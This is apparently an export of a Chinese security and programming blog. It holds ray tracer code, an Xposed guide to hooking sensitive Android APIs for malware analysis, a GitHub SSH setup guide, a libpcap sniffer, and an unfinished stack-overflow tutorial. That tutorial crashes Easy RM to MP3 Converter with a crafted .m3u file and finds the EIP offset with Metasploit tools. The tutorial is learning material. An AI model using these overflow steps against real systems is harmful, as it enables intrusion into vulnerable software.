intxObj.iO.bary[1] = iO.bary[1]; intxObj.iO.bary[2] = iO.bary[2]; &#125; &#125; &#125; if (flag == 1) &#123; //如果为1则计算从light到p点的距离t2 if (dir.x != 0) &#123; t2 = (p2.x - raySrc.x) / dir.x; &#125; else if (dir.y != 0) &#123; t2 = (p2.y - raySrc.y) / dir.y; &#125; else if (dir.z != 0) &#123; t2 = (p2.z - raySrc.z) / dir.z; &#125; else t2 = 0; //t2和t1进行比较，如果t1小于t2则说明没有物体挡住光线 if (t1 &gt;= t2) &#123; Obj = -1; id = -1; &#125; &#125; else if ((t1 &gt;= 0) &amp;&amp; (Obj == 1)) q = caluPoint(raySrc, dir, t1); intxObj.p = q; intxObj.t = t1; intxObj.tID = id; intxObj.tObj = Obj; return intxObj;&#125;point findColor(int x, int y)&#123; //point p, q, dir, light, lightS; //point black, pixColor, temp, tempN; //intexPoint intxObj, intxFlag; point black, pixColor, p; black.x = 0.0; black.y = 0.0; black.z = 0.0; pixColor = black; //将像素点转换为世界坐标 p.x = (((double)x / (double)WIDTH) * 2 * xMax) - xMax; p.y = (((double)y / (double)HEIGHT) * 2 * yMax) - yMax; p.z = -1; point dir1, p1 = p; dir1 = minusPoint(p, cam); dir1 = unitize(dir1); pixColor = Render(p, dir1); if (pixColor.x &gt; 1) pixColor.x = 1.f; if (pixColor.y &gt; 1) pixColor.y = 1.f; if (pixColor.z &gt; 1) pixColor.z = 1.f; return pixColor;&#125;//迭代渲染point Render(point p, point dir)&#123; Steps++; point blackColor, pixColor, q, light, dir1, temp, temp1; point reflect_ray; intexPoint intxObj, intxFlag; blackColor.x = 0.0; blackColor.y = 0.0; blackColor.z = 0.0; pixColor = blackColor; if (Steps &gt; MaxStep) &#123; Steps = 0; return blackColor; &#125; point p1 = p; intxObj = intersectObjects(p, p1, dir, 0); //如果和一个物体有交点 if (intxObj.tID != -1) &#123; q = intxObj.p; reflect_ray = reflect(intxObj, dir); pixColor.x += ambient_light[0]; pixColor.y += ambient_light[1]; pixColor.z += ambient_light[2]; for (int h = 0; h &lt; num_lights; h++) &#123; light.x = lights[h].position[0]; light.y = lights[h].position[1]; light.z = lights[h].position[2]; dir1 = minusPoint(light, q); dir1 = unitize(dir1); intxFlag = intersectObjects(q, light, dir1, 1); //如果没有物体遮挡 if (intxFlag.tID == -1) &#123; //phong模型求出颜色 temp = phong(q, intxObj.tID, intxObj.tObj, intxObj.iO, lights[h], cam); pixColor.x += temp.x; pixColor.y += temp.y; pixColor.z += temp.z; &#125; &#125; temp1 = Render(q, reflect_ray); int id = intxObj.tID; if (intxObj.tObj == 1) &#123; pixColor.x += temp1.x * spheres[id].color_specular[0]; pixColor.y += temp1.y * spheres[id].color_specular[1]; pixColor.z += temp1.z * spheres[id].color_specular[2]; &#125; else &#123; point tp = chazhi(triangles[id], intxObj.iO, 2); pixColor.x += temp1.x * tp.x; pixColor.y += temp1.y * tp.y; pixColor.z += temp1.z * tp.z; &#125; &#125; else &#123; pixColor = blackColor; Steps = 0; &#125; return pixColor;&#125;//反射的光线的方向point reflect(intexPoint intx, point dir)&#123; point result; point n; if (intx.tObj == 1) &#123; n = findSphereNormal(intx.p, intx.tID); &#125; else &#123; n = unitize(chazhi(triangles[intx.tID], intx.iO, 0)); &#125; dir.x = -dir.x; dir.y = -dir.y; dir.z = -dir.z; double r1 = dot(n, dir); point n2; n2.x = n.x * 2 * r1; n2.y = n.y * 2 * r1; n2.z = n.z * 2 * r1; result = n2; return result;&#125;void drawColor()&#123; unsigned int x, y; point pixColor; for (x = 0; x &lt; WIDTH; x++) &#123; for (y = 0; y &lt; HEIGHT; y++) &#123; pixColor = findColor(x, y); plot_pixel_jpeg(x, y, abs(pixColor.x) * 255, abs(pixColor.y) * 255, abs(pixColor.z) * 255); &#125; &#125;&#125;//MODIFY THIS FUNCTIONvoid draw_scene()&#123; unsigned int x,y; //glPointSize(2.0); //glBegin(GL_POINTS); //simple output for(x=0; x&lt;WIDTH; x++) &#123;glPointSize(2.0); glBegin(GL_POINTS);for(y=0;y &lt; HEIGHT;y++)&#123; // plot_pixel(x,y,x%256,y%256,(x+y)%256); plot_pixel_display(x, y, buffer[HEIGHT - y - 1][x][0], buffer[HEIGHT - y - 1][x][1], buffer[HEIGHT - y - 1][x][2]);&#125;glEnd();glFlush(); &#125; printf("Done!\n"); fflush(stdout);&#125;void plot_pixel_display(int x,int y,unsigned char r,unsigned char g,unsigned char b)&#123; glColor3f(((double)r)/256.f,((double)g)/256.f,((double)b)/256.f); glVertex2i(x,y);&#125;void plot_pixel_jpeg(int x,int y,unsigned char r,unsigned char g,unsigned char b)&#123; buffer[HEIGHT-y-1][x][0]=r; buffer[HEIGHT-y-1][x][1]=g; buffer[HEIGHT-y-1][x][2]=b;&#125;void plot_pixel(int x,int y,unsigned char r,unsigned char g, unsigned char b)&#123; plot_pixel_display(x,y,r,g,b); if(mode == MODE_JPEG) plot_pixel_jpeg(x,y,r,g,b);&#125;/*void save_jpg()&#123; Pic *in = NULL; in = pic_alloc(640, 480, 3, NULL); printf("Saving JPEG file: %s\n", filename); memcpy(in-&gt;pix,buffer,3*WIDTH*HEIGHT); if (jpeg_write(filename, in))printf("File saved Successfully\n"); elseprintf("Error in Saving\n"); pic_free(in); &#125;*/void parse_check(char *expected,char *found)&#123; if(stricmp(expected,found))&#123; char error[100]; printf("Expected '%s ' found '%s '\n",expected,found); printf("Parse error, abnormal abortion\n"); exit(0);&#125;&#125;void parse_doubles(FILE*file, char *check, double p[3])&#123; char str[100]; fscanf(file,"%s",str); parse_check(check,str); fscanf(file,"%lf %lf %lf",&amp;p[0],&amp;p[1],&amp;p[2]); printf("%s %lf %lf %lf\n",check,p[0],p[1],p[2]);&#125;void parse_rad(FILE*file,double *r)&#123; char str[100]; fscanf(file,"%s",str); parse_check("rad:",str); fscanf(file,"%lf",r); printf("rad: %f\n",*r);&#125;void parse_shi(FILE*file,double *shi)&#123; char s[100]; fscanf(file,"%s",s); parse_check("shi:",s); fscanf(file,"%lf",shi); printf("shi: %f\n",*shi);&#125;int loadScene(char *argv)&#123; FILE *file = fopen(argv,"r"); int number_of_objects; char type[50]; int i; Triangle t; Sphere s; Light l; fscanf(file,"%i",&amp;number_of_objects); printf("number of objects: %i\n",number_of_objects); char str[200]; parse_doubles(file,"amb:",ambient_light); for(i=0;i &lt; number_of_objects;i++)&#123; fscanf(file,"%s\n",type); printf("%s\n",type); if(stricmp(type,"triangle")==0) &#123; printf("found triangle\n"); int j; for(j=0;j &lt; 3;j++) &#123; parse_doubles(file,"pos:",t.v[j].position); parse_doubles(file,"nor:",t.v[j].normal); parse_doubles(file,"dif:",t.v[j].color_diffuse); parse_doubles(file,"spe:",t.v[j].color_specular); parse_shi(file,&amp;t.v[j].shininess); &#125; if(num_triangles == MAX_TRIANGLES) &#123; printf("too many triangles, you should increase MAX_TRIANGLES!\n"); exit(0); &#125; triangles[num_triangles++] = t; &#125; else if(stricmp(type,"sphere")==0) &#123; printf("found sphere\n"); parse_doubles(file,"pos:",s.position); parse_rad(file,&amp;s.radius); parse_doubles(file,"dif:",s.color_diffuse); parse_doubles(file,"spe:",s.color_specular); parse_shi(file,&amp;s.shininess); if(num_spheres == MAX_SPHERES) &#123; printf("too many spheres, you should increase MAX_SPHERES!\n"); exit(0); &#125; spheres[num_spheres++] = s; &#125; else if(stricmp(type,"light")==0) &#123; printf("found light\n"); parse_doubles(file,"pos:",l.position); parse_doubles(file,"col:",l.color); if(num_lights == MAX_LIGHTS) &#123; printf("too many lights, you should increase MAX_LIGHTS!\n"); exit(0); &#125; lights[num_lights++] = l; &#125; else &#123; printf("unknown type in scene description:\n%s\n",type); exit(0); &#125;&#125; return 0;&#125;void display()&#123; cam.x = 0.0; cam.y = 0.0; cam.z = 0.0; glLoadIdentity(); drawColor(); draw_scene();&#125;void init()&#123; glMatrixMode(GL_PROJECTION); glOrtho(0,WIDTH,0,HEIGHT,1,-1); glMatrixMode(GL_MODELVIEW); glLoadIdentity(); glClearColor(0,0,0,0); glClear(GL_COLOR_BUFFER_BIT);&#125;void idle()&#123; //hack to make it only draw once static int once=0; if (!once) &#123; draw_scene();// if (mode == MODE_JPEG)// save_jpg(); &#125; once=1;&#125;int main (int argc, char ** argv)&#123; if (argc&lt;2 || argc &gt; 3) &#123; printf ("usage: %s &lt;scenefile&gt; [jpegname]\n", argv[0]);exit(0); &#125; if(argc == 3)&#123; mode = MODE_JPEG; filename = argv[2];&#125; else if(argc == 2)mode = MODE_DISPLAY; glutInit(&amp;argc,argv); loadScene(argv[1]); glutInitDisplayMode(GLUT_RGBA | GLUT_SINGLE); glutInitWindowPosition(0,0); glutInitWindowSize(WIDTH,HEIGHT); int window = glutCreateWindow("Ray Tracer"); glutDisplayFunc(display); glutIdleFunc(idle); init(); glutMainLoop();&#125; 运行结果如图所示]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XposedHook:hook敏感函数]]></title>
    <url>%2F2016%2F08%2F16%2Fxposed%2F</url>
    <content type="text"><![CDATA[Xposed框架Xposed框架通过修改Android系统的源码，并替换Android的主程序Zygote(Init 是所有Linux程序的起点，而Zygote于Android，正如它的英文意思，是所有java程序的’孵化池’)，从而能够控制Android进程的执行流程，hook java层的API。 首先在app_main.cpp中，对appRuntime.cpp进行了修改，其中onVmCreated(JNIEnv* env)修改如下： 在onVmCreate中，它将调用libxposed_dalvik.so中的xposedInitLib函数，然后再调用so中设置的onVmCreated函数。这个onVmCreated函数由xposedInitLib设置。 在app_main.cpp的main方法中，进行了对xposed的环境初始化： 最后，如果xposed框架启用成功，那么zygote的入口类将由以前的com.android.internal.os.ZygoteInit变成de.robv.android.xposed.XposedBridge。 下面我们按照执行流程，把相关函数分析一遍： AppRuntime的onVmCreated，它最终会导致libxposed_dalvik.so中的onVmCreated被调用。我们直接分析最后这个onVmCreated。 然后AppRuntime里会调用de.robv.android.xposed.XposedBridge.main函数。 所以通过调用XposedBridge.main函数，可以给APK进程的一些特定函数挂上钩子，从而能够监听该函数，进而通过beforeHookedMethod和afterHookedMethod方法可以分别实现调用函数前的操作和调用函数后的操作。 Hook用到的具体函数下面给出我在做Android恶意程序分析时需要hook的函数的一些操作，该程序参考了halfkiss的框架。 用到的Xposed的函数： 首先定义一个抽象类MethodHookCallBack继承自Xposed的XC_MethodHook类，该类有两个方法:beforeHookedMethod(MethodHookParam param)和AfterHookedMethod(MethodHookParam param)方法，这两个方法分别对应于要hook的函数调用之前所要执行的动作与该函数调用之后所要执行的动作。比如： 1234public void beforeHookedMethod(MethodHookParam param)&#123; Log.i("Before hook");&#125; 上面的例子说明在调用要hook的函数之前打印一段log为Before hook。 Xposed的hook的主函数hookMethod(Member hookMethod, XC_MethodHook callback),其中参数hookMethod表示要hook的函数，该函数可以通过java的反射机制获得，具体怎么获得在下面会讲到，参数callback就是前面讲到的Xposed函数的XC_MethodHook类，该类主要是表示该对要hook的函数做怎样的处理。具体的hookMethod方法如下图所示: 由hookMethod可知，一个目标函数可以挂多个钩子，这些钩子由一个集合来存储。然后我们将转到JNI层去看看hookMethodNative干了什么事情。这才是hook的核心。分析如下图所示： 所以当apk执行被hook的函数时，实际执行的是hookMethodCallBack函数，该函数就是钩子函数，我们来看看hookmethodCallBack函数具体是怎么执行的，该函数在libXposed_dalvik.cpp中。 在xposedHandleHookedMethod函数中会以此执行钩子函数，即在前面介绍的XC_MethodHook函数，然后再会执行程序的原函数。 在此，Hook需要用到的基本函数已经介绍完毕。接下来会介绍如何利用Xposed来实现hook敏感函数的操作。 hook敏感函数 首先定义MethodHookCallBack类继承自XC_MethodHook,该函数实现了beforeHookedMethod和afterHookedMethod函数，主要是获得HookParam类，该类主要是存储了一些MethodHookParam的一些参数。然后调用该类中beforeHookedMethod(HookParam param)或者afterHookedMethod(HookParam param)。 1234567891011121314151617181920212223242526public abstract class MethodHookCallBack extends XC_MethodHook &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; // TODO Auto-generated method stub super.beforeHookedMethod(param); HookParam hookParam = HookParam.fromXposed(param); this.beforeHookedMethod(hookParam); if(hookParam.hasResult()) param.setResult(hookParam.getResult()); &#125; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; // TODO Auto-generated method stub super.afterHookedMethod(param); HookParam hookParam = HookParam.fromXposed(param); this.afterHookedMethod(hookParam); if(hookParam.hasResult()) param.setResult(hookParam.getResult()); &#125; public abstract void beforeHookedMethod(HookParam param); public abstract void afterHookedMethod(HookParam param); &#125; 根据字符串找到要hook的函数，主要是利用java的反射函数，如果有兴趣的可以去查阅一下java的反射机制，主要是通过字符串来得到相应的类，函数或变量等，具体代码如下： 1234567891011121314151617public static Method findMethod(String className, ClassLoader classLoader, String methodName, Class&lt;?&gt;... parameterTypes) &#123; try &#123; Class clazz = classLoader.loadClass(className); Method method = clazz.getDeclaredMethod(methodName, parameterTypes); method.setAccessible(true); return method; &#125; catch (NoSuchMethodException e) &#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; return null;&#125; 我们通过该方法可以获得要hook的具体method。 定义抽象类AbstractBahaviorHookCallBack继承自前面讲到的MethodHookCallBack类，该类具体实现当调用要hook的函数时，就打印该函数。具体实现如下： 123456789101112131415161718192021222324252627282930313233343536373839 public abstract class AbstractBahaviorHookCallBack extends MethodHookCallBack &#123; @Override public void beforeHookedMethod(HookParam param) &#123; // TODO Auto-generated method stub /*int length = param.args.length; Object[] m = param.args; String args = "/"; for(int i = 0; i &lt; length;i++) &#123; args+=(String)m[i]+"/"; &#125;*/ Logger.logD("Invoke "+ param.method.getDeclaringClass().getName()+"-&gt;"+param.method.getName()); this.descParam(param); //this.printStackInfo(); &#125; @Override public void afterHookedMethod(HookParam param) &#123; // TODO Auto-generated method stub //Logger.log_behavior("End Invoke "+ param.method.toString()); &#125; private void printStackInfo()&#123; Throwable ex = new Throwable(); StackTraceElement[] stackElements = ex.getStackTrace(); if(stackElements != null)&#123; StackTraceElement st; for(int i=0; i&lt;stackElements.length; i++)&#123; st = stackElements[i]; if(st.getClassName().startsWith("com.android.binpang")||st.getClassName().startsWith("de.robv.android.xposed.XposedBridge")) continue; Logger.logD(st.getClassName()+":"+st.getMethodName()+":"+st.getFileName()+":"+st.getLineNumber()); &#125; &#125; &#125; public abstract void descParam(HookParam param);&#125; 具体要实现的hook函数 123456789101112131415Method sendTextMessagemethod = FindMethod.findMethod( "android.telephony.SmsManager", ClassLoader.getSystemClassLoader(), "sendTextMessage", String.class,String.class,String.class,PendingIntent.class,PendingIntent.class); hookhelper.hookMethod(sendTextMessagemethod, new AbstractBahaviorHookCallBack() &#123; @Override public void descParam(HookParam param) &#123; // TODO Auto-generated method stub Logger.logI("Send SMS -&gt;"); String dstNumber = (String)param.args[0]; String content = (String)param.args[2]; Logger.logI("SMS DestNumber:"+dstNumber); Logger.logI("SMS Content:"+content); &#125; &#125;); 该示例函数是hook了android.telephony.SmeManager/sendTextMessage函数，当调用该函数的时候，会打印出来要发送的目标号码，及发送的message的内容。 监听的敏感函数列表 SmsManager android.telephony.SmsManager/sendTextMessage android.telephony.SmsManager/getAllMessagesFromIcc android.telephony.SmsManager/sendDataMessage android.telephony.SmsManager/sendMultipartTextMessage TelephonyManager android.telephony.TelephonyManager/getLine1Number android.telephony.TelephonyManager/listen AccountManager android.accounts.AccountManager/getAccounts android.accounts.AccountManager/getAccountsByType ActivityManager android.app.ActivityManager/killBackgroundProcesses android.app.ActivityManager/forceStopPackage AlarmManager android.app.AlarmManager/setImpl AudioRecord android.media.AudioRecord Camera android.hardware.Camera/takepicture android.hardware.Camera/setPreviewCallback android.hardware.Camera/setPreviewCallbackWithBuffer android.hardware.Camera/setOneShotPreviewCallback ConnectivityManager android.net.ConnectivityManager/setMobileDataEnabled ContentResolver android.content.ContentResolver/qurey android.content.ContentResolver/registerContentObserver android.content.ContentResolver/insert android.content.ContentResolver/bulkInsert android.content.ContentResolver/delete android.content.ContentResolver/update android.content.ContentResolver/applyBatch ContextImpl android.app.ContextImpl/registerReceiver MediaRecorder android.media.MediaRecorder/start android.media.MediaRecorder/stop Internet java.net.URL/openConnection org.apache.http.impl.client.AbstractHttpClient/execute NotificationManager android.app.NotificationManager/notify ApplicationPackageManager android.app.ApplicationPackageManager/installPackage android.app.ApplicationPackageManager/deletePackage android.app.ApplicationPackageManager/getInstalledPackages Xposed编程步骤 首先在xposedbridgeapi.jar包导入到项目中，这里采用了XposedBridgeApi-54.jar包 再项目的assets文件夹中新建一个xposed_init文件(没有后缀)，该文件表示该xposed模板的主函数类的具体路径，比如该项目为 在AndroidManifest.xml文件的标签下添加xposed的一些信息，以便Xposed能够识别该模板。 123456789101112131415161718192021222324252627282930313233343536&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"package="com.example.methodhook"android:versionCode="1"android:versionName="1.0" &gt;&lt;uses-sdkandroid:minSdkVersion="18"android:targetSdkVersion="21" /&gt;&lt;applicationandroid:allowBackup="true"android:icon="@drawable/ic_launcher"android:label="@string/app_name"android:theme="@style/AppTheme" &gt;&lt;activityandroid:name="com.binpang.methodhook.MainActivity"android:label="@string/app_name" &gt;&lt;intent-filter&gt;&lt;action android:name="android.intent.action.MAIN" /&gt;&lt;category android:name="android.intent.category.LAUNCHER" /&gt;&lt;/intent-filter&gt;&lt;/activity&gt;&lt;meta-dataandroid:name="xposedmodule"android:value="true" /&gt;&lt;meta-dataandroid:name="xposedminversion"android:value="40" /&gt;&lt;meta-dataandroid:name="xposeddescription"android:value="Monitor the System's apis" /&gt;&lt;/application&gt;&lt;/manifest&gt; 在Android手机(或模拟器,建议使用模拟器，一般的模拟器都已经root过了)中安装XposedInstaller(需要root权限), 由于Xposed替换了Android的一些程序，所以需要重启才能生效。 然后启动该模板程序，使其安装到Android手机中，然后再Xposed的模板中找到它，并打钩，如图所示： 演示hook结果通过短信软件向5554号码发送”hello,world”内容，如图所示： 结果查找logcat如图所示: 具体可以参考我的github]]></content>
      <categories>
        <category>Hook</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Hook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[github添加ssh秘钥]]></title>
    <url>%2F2016%2F04%2F16%2Fgithub-ssh%2F</url>
    <content type="text"><![CDATA[在windows下git push时由于每次都要提示输入用户名，密码，确实很繁杂，我们可以在windows下生成ssh秘钥，并将公钥放到github上，这样每次git push时就会自动匹配github上的公钥和自己机器上的密钥，从而避免自己输入用户名，密码。 首先下载git客户端，这里提供一个下载地址。 将git客户端安装之后，右键打开git bash 在git bash中输入ssh-keygen，然后就会提示生成文件的路径，在此默认路径即可，然后提示输入密码，在此可以不输入密码，也可以输入，如果输入的时候，先记住，在后面的步骤会用到。 在生成ssh公钥密钥的文件夹中找到一个.pub后缀名的文件，用记事本打开，将其全部内容粘贴。 打开github客户端,在右上角自己头像处点击，找到setting，然后找到SSH and GPG keys,点解new SSH keys,将粘贴的.pub文件的内容添加进去，保存即可。 在自己客户端确认。在git bash中输入ssh -T git@github.com,输入yes，然后输入上步自己填的密码，回车，即可。最后结果如图所示：]]></content>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ExploitTutorial]]></title>
    <url>%2F2016%2F04%2F13%2FExploitTutorial%2F</url>
    <content type="text"><![CDATA[声明：本博客是根据Exploit该链接所写 准备工作 实验环境：windows xp windows xp sp3 下载easyRmtomp3.exe,下载地址：https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe 使程序crash 编写一个程序生成10000个字符，可以使程序crash，程序如图所示 crash的程序如下图所示： 但没有出现崩溃，可见改程序采取了保护措施，将A的数量增加，增加到20000时，也不会崩溃，当增加到30000时，程序崩溃。如图所示： 会出现地址指针EIP指向0x41414141地址，由于找不到改地址所以该程序会发生崩溃。 栈信息介绍栈的信息如下图所示： 确定return的地址偏移 构造buffer字符串，生成25000个’A’和5000个’B’时，观察EIP的数值12345678910111213141516171819202122#include&lt;stdio.h&gt; int main() &#123; FILE* fp = NULL; fp = fopen("crash2.m3u","w+"); int i = 0; if(fp == NULL) return; for(i;i &lt; 25000; i++) &#123; fprintf(fp,"\x41"); &#125; for(i = 0; i &lt; 5000; i++) &#123; fprintf(fp, "\x42"); &#125;&#125; 调试结果如图所示： 可以知道EIP为0x42424242,所以return地址偏移在25000和30000之间 测试eip的offset具体在什么位置 利用metasploit的工具测试具体在什么位置，具体如下：cd metasplot-framework/tools ./pattern_create.rb 5000 &gt; mima.txt 生成5000大小的字符串并输出到mima.txt文件 构建前25000个为A，后5000个位mima.txt为内容的.m3u文件，如图所示： 得到的eip结果如下图所示： 可知eip的值为0x42316A42 然后利用metasploit工具找到具体是什么位置，命令如下：.pattern_offset.rb 0x423116A42 5000,得到结果为1053 测试一下1053是否正确，编写如下程序： 运行测试一下，结果如下图： 可以看到eip指向的是0x42424242，所以找到的return的地址偏移是正确的 该教程先写到这，有空再继续(＾－＾)V]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>Exploit</tag>
        <tag>反汇编</tag>
        <tag>翻译</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[libpcap编程:Sniffer]]></title>
    <url>%2F2016%2F03%2F16%2FSniffer%2F</url>
    <content type="text"><![CDATA[主要实现运用libpcap(winpcap)的api进行数据链路层的抓包操作，并一层层进行解析，解析TCP, UDP, ICMP等协议。 主要代码及解析如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224/************************************************************************* &gt; File Name: sniffer.c &gt; Author: PCB &gt; Mail: pangbin2415@gmai.com &gt; Created Time: 2016年04月10日 星期日 20时40分52秒 ************************************************************************/#include&lt;stdio.h&gt;#include&lt;pcap.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;signal.h&gt;#include&lt;sys/socket.h&gt;#include&lt;netinet/in.h&gt;#include&lt;arpa/inet.h&gt;#include&lt;netinet/ip.h&gt;#include&lt;netinet/tcp.h&gt;#include&lt;netinet/udp.h&gt;#include&lt;netinet/ip_icmp.h&gt;pcap_t* pd;int linkhdrlen; //链路层的长度/* * device: 要连接的设备名字 * bpfstr: 要过滤的规则 * */pcap_t* open_pcap_socket(char* device, const char* bpfstr)&#123;char errbuf[PCAP_ERRBUF_SIZE]; //存放出错信息pcap_t* pd;uint32_t srcip, netmask; //存放源的ip地址和子网掩码struct bpf_program bpf; //存取bpf过滤规则的一个结构//找到一个设备if(!*device &amp;&amp; !(device == pcap_lookupdev(errbuf)))&#123;printf("pcap_lookupdev(): %s\n", errbuf);return NULL;&#125;//打开该设备，并且等到一个包到来if((pd = pcap_open_live(device, BUFSIZ, 1, 0, errbuf)) == NULL)&#123;printf("pcap_open_live(): %s\n", errbuf);return NULL;&#125;//得到设备的ip地址和ip的掩码if(pcap_lookupnet(device, &amp;srcip, &amp;netmask, errbuf) &lt; 0)&#123;printf("pcap_lookupnet: %s\n", errbuf); return NULL;&#125;//应用过滤规则if(pcap_compile(pd, &amp;bpf, (char*)bpfstr, 0, netmask))&#123;printf("pcap_compile(): %s\n", pcap_geterr(pd));return NULL;&#125;if(pcap_setfilter(pd, &amp;bpf)&lt;0)&#123;printf("pcap_setfilter(): %s\n", pcap_geterr(pd));return NULL;&#125;//printf("Open_pcapSocket()\n");return pd;&#125;//end open_pcap_socket(char* device, const char* bpfstr);void capture_loop(pcap_t* pd, int packets, pcap_handler func)&#123;int linktype;//判断数据链路层的类型if((linktype = pcap_datalink(pd)) &lt; 0)&#123;printf("pcap_datalink(): %s\n", pcap_geterr(pd));return;&#125;switch(linktype)&#123;case DLT_NULL://BSD回路封装;链路层协议是一个4字节的域linkhdrlen = 4;break;case DLT_EN10MB: //以太网，链路层协议是一个14字节的域linkhdrlen = 14;break;case DLT_SLIP: case DLT_PPP:linkhdrlen = 24; //链路层长度为24个字节break;default:printf("Unsupport datalink (%d)\n", linktype);return;&#125;//开始抓包if(pcap_loop(pd, packets, func, 0) &lt; 0)printf("pcap_loop failed: %s\n", pcap_geterr(pd));&#125;/* * 解析包的程序*/void parse_packet(u_char *user, struct pcap_pkthdr* packethdr, u_char* packetptr)&#123;struct ip* iphdr; //netinet库的ip结构struct icmphdr* icmphdr; //icmp结构struct tcphdr* tcphdr;//tcp结构struct udphdr* udphdr;//udp结构char iphdrInfo[256], srcip[256], dstip[256];unsigned short id, seq;packetptr += linkhdrlen; //过滤掉数据链路层的数据iphdr = (struct ip*)packetptr;strcpy(srcip, inet_ntoa(iphdr-&gt;ip_src));strcpy(dstip, inet_ntoa(iphdr-&gt;ip_dst));sprintf(iphdrInfo, "ID:%d TOS:0x%x, TTL:%d, Iplen:%d Dglen:%d", ntohs(iphdr-&gt;ip_id), iphdr-&gt;ip_tos, iphdr-&gt;ip_ttl, 4*iphdr-&gt;ip_hl, ntohs(iphdr-&gt;ip_len) );//将ip的字段跳过去packetptr += 4*iphdr-&gt;ip_hl;switch(iphdr-&gt;ip_p)&#123;case IPPROTO_TCP: //如果是TCP协议tcphdr = (struct tcphdr*)packetptr;printf("TCP %s:%d -&gt; %s:%d\n", srcip, ntohs(tcphdr-&gt;source), dstip, ntohs(tcphdr-&gt;dest));printf("%s\n", iphdrInfo);printf("%c%c%c%c%c%c Seq: 0x%x Ack: 0x%x Win: 0x%x TcpLen: %d\n", (tcphdr-&gt;urg ? 'U' : '*'), (tcphdr-&gt;ack ? 'A' : '*'), (tcphdr-&gt;psh ? 'P' : '*'), (tcphdr-&gt;rst ? 'R' : '*'), (tcphdr-&gt;syn ? 'S' : '*'), (tcphdr-&gt;fin ? 'F' : '*'), ntohl(tcphdr-&gt;seq), ntohl(tcphdr-&gt;ack_seq), ntohs(tcphdr-&gt;window), 4*tcphdr-&gt;doff );break;case IPPROTO_UDP: //UDP协议udphdr = (struct udphdr*) packetptr;printf("UDP %s:%d -&gt; %s:%d\n", srcip, ntohs(udphdr-&gt;source), dstip, ntohs(udphdr-&gt;dest) );printf("%s\n", iphdrInfo);break;case IPPROTO_ICMP: //ICMP协议icmphdr = (struct icmphdr*)packetptr;printf("ICMP %s -&gt; %s\n", srcip, dstip);printf("%s\n", iphdrInfo);memcpy(&amp;id, (u_char*)icmphdr+4, 2);memcpy(&amp;seq, (u_char*)icmphdr+6, 2);printf("Type:%d Code:%d ID:%d Seq:%d\n", icmphdr-&gt;type, icmphdr-&gt;code, ntohs(id), ntohs(seq));break;&#125;printf("---------------------------------------------\n\n");&#125;void quiteOut(int signo)&#123;struct pcap_stat stats;if(pcap_stats(pd, &amp;stats) &gt;= 0)&#123;printf("%d packets received\n", stats.ps_recv);printf("%d packtes dropped\n\n", stats.ps_drop);&#125;pcap_close(pd);exit(0);&#125;int main(int argc, char **argv)&#123;char interface[256] = "", bpfstr[256] = "";int packets = 0, c,i;while((c = getopt(argc, argv, "i:n:") ) != -1) //读取参数，当为-i时，指定接口，当为-n时，指定读取多少packets&#123;switch(c)&#123;case 'i':strcpy(interface, optarg);break;case 'n':packets = atoi(optarg);break;&#125;&#125; //获取过滤的字符串for(i = optind; i &lt; argc; i++)&#123;strcat(bpfstr, argv[i]);strcat(bpfstr, " ");&#125;//连接接口if((pd = open_pcap_socket(interface, bpfstr)))&#123;/*/ * 绑定中断事件给quiteOut函数*/signal(SIGINT, quiteOut);signal(SIGTERM, quiteOut);signal(SIGQUIT, quiteOut);capture_loop(pd, packets, (pcap_handler)parse_packet);quiteOut(0);&#125;exit(0);&#125; 主要使用该程序支持监听的接口及一共要接收的数据包的大小，并且提供过滤功能，具体使用如下： sudo ./sniffer -i eth0 tcp port 80 运行结果如下]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>sniffer</tag>
        <tag>网络</tag>
      </tags>
  </entry>
</search>